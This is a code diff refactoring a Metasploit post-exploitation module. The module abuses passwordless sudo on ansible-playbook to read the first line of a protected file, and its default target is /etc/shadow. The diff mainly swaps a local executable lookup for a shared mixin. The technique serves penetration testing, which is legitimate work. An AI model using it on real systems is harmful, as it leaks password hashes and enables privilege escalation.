@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Local::Ansible
 
   def initialize(info = {})
     super(
@@ -38,7 +39,6 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptString.new('ANSIBLEPLAYBOOK', [true, 'Ansible-playbook executable location', '']),
         OptString.new('FILE', [true, 'File to read the first line of', '/etc/shadow']),
       ], self.class
     )
@@ -50,21 +50,9 @@ class MetasploitModule < Msf::Post
     )
   end
 
-  def ansible_exe
-    return @ansible if @ansible
-
-    ['/usr/local/bin/ansible-playbook', '/usr/bin/ansible-playbook', datastore['ANSIBLEPLAYBOOK']].each do |exec|
-      next unless file?(exec)
-      next unless executable?(exec)
-
-      @ansible = exec
-    end
-    @ansible
-  end
-
   def run
-    fail_with(Failure::NotFound, 'Ansible-playbook executable not found') if ansible_exe.nil?
-    fail_with(Failure::NotFound, "Target file to read not found: #{datastore['file']}") unless file?(datastore['FILE'])
+    fail_with(Failure::NotFound, 'Ansible-playbook executable not found') if ansible_playbook_exe.nil?
+    fail_with(Failure::NotFound, "Target file to read not found: #{datastore['FILE']}") unless file?(datastore['FILE'])
 
     vprint_status('Checking sudo')
     # check we can sudo
@@ -86,7 +74,7 @@ class MetasploitModule < Msf::Post
     end
     fail_with(Failure::NoAccess, "ansible-playbook can't be run with a passwordless sudo") unless can_sudo_playbook
 
-    cmd = "sudo -n #{ansible_exe} #{datastore['FILE']}"
+    cmd = "sudo -n #{ansible_playbook_exe} #{datastore['FILE']}"
     print_status "Executing: #{cmd}"
     output = cmd_exec(cmd).to_s
 
